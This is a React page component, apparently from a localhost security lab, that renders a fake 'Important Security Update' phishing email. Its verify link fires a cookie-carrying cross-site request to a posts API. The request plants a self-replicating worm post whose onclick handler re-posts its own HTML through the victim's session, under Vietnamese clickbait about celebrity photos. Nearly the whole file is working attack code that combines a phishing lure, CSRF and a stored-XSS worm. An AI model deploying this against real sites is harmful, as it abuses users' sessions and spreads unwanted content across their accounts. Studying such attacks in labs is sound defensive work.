import MainLayout from '../components/Layout/MainLayout';

const CSRFAttackPage = () => {
  const handleClick = (e) => {
    e.preventDefault();

    // Tạo nội dung worm - chỉ tạo một post ban đầu
    const wormContent = `     
        <a href="#" onclick="fetch('http://localhost:5001/api/posts/create',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({content:this.outerHTML})})">Click để xem ảnh hot nhất của Ngọc Trinh!</a>
          `;

    // Sử dụng fetch để gửi POST request
    // fetch('http://localhost:5001/api/posts/create', {
    //   method: 'POST',
    //   credentials: 'include', // Cho phép gửi cookies
    //   body: JSON.stringify({
    //     content: wormContent,
    //   }),
    // })
    // Sử dụng fetch để gửi GET request
    fetch('http://localhost:5001/api/posts/create?content=' + encodeURIComponent(wormContent), {
      method: 'GET',
      credentials: 'include', // Cho phép gửi cookies
    })
      .then((response) => response.json())
      .then((data) => {
        console.log('Initial worm post created:', data);
      })
      .catch((error) => {
        console.error('Failed to create initial post:', error);
      });
  };

  return (
    <MainLayout>
      <div className="max-w-2xl mx-auto p-6 bg-white rounded-lg shadow-md">
        <div className="border-b pb-4 mb-4">
          <h1 className="text-2xl font-bold text-gray-800">Important Security Update</h1>
          <p className="text-gray-600">From: security@example.com</p>
          <p className="text-gray-600">To: user@example.com</p>
        </div>

        <div className="prose">
          <p>Dear User,</p>

          <p>
            We have detected some unusual activity on your account. To ensure your security, please
            verify your account by clicking the link below:
          </p>

          <div className="my-4 p-4 bg-gray-100 rounded">
            <a href="#" onClick={handleClick} className="text-blue-600 hover:underline">
              Click here to verify your account
            </a>
          </div>

          <p>If you did not request this verification, please ignore this email.</p>

          <p>
            Best regards,
            <br />
            Security Team
          </p>
        </div>
      </div>
    </MainLayout>
  );
};

export default CSRFAttackPage;
